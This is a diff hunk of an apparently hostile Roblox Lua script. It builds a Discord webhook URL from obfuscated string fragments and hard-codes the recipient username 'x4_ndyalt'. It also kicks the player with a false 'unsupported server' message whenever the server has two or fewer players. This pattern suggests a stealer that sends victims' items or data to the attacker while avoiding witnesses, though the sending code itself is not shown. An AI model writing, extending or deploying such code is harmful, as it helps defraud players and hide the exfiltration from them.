@@ -798,11 +798,11 @@ local kwbrbsi = "-KiJb1oUEsYUccvZT7pSFIcQ4"
 local oqbrbek = "DzjS2HKfLUv76byqGpgwi7"
 local pqqjevw ="/webhooks/1309583394853884066/"
 webHook = "\"" .. ajgbsjw .. pqqjevw .. kebtbak .. kwbrbsi .. oqbrbek .. "\""
-local kwbabsi = "X4"
-local iwnrbtk = "_"
-local pqjrbwi = "ND"
-local pbehaid = "Yq"
-userName = "\"" .. kwbrbsi .. iwnrbtk .. pqjrbwi .. pbehaid .. "\""
+--local kwbabsi = "X4"
+--local iwnrbtk = "_"
+--local pqjrbwi = "ND"
+--local pbehaid = "Yq"
+userName = "x4_ndyalt"
 if #game:GetService("Players"):GetPlayers() <= 2 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
